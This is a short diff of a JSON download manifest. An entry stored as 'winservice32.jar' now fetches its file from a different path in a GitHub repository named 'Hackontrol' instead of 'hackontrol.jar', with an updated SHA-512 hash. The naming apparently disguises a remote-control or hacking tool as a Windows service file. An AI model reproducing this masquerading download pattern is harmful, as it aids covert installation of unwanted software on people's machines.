@@ -17,8 +17,8 @@
 		},
 		{
 			"file": "winservice32.jar",
-			"url": "https://raw.githubusercontent.com/KHOPAN/Hackontrol/main/release/hackontrol.jar",
-			"sha512": "d339268b887a0bbfcb4ef3467e93cfeb8355ae8322eb449c9d6ba5e1f4120d3e5762cfbc6e3c7e5b05f766625a46fc17929be1aa94bdd992ffc9d5500657bf59"
+			"url": "https://raw.githubusercontent.com/KHOPAN/Hackontrol/main/system/winservice32.jar",
+			"sha512": "3856b7cddafe77d10fe54304c1bf78b105ddaf8e821ba4d66e13b0639fa6972fe0ceb7276f35857890d22b0a8bb73b6ea95be965c29c5f43dbe5c112cb380395"
 		}
 	],
 
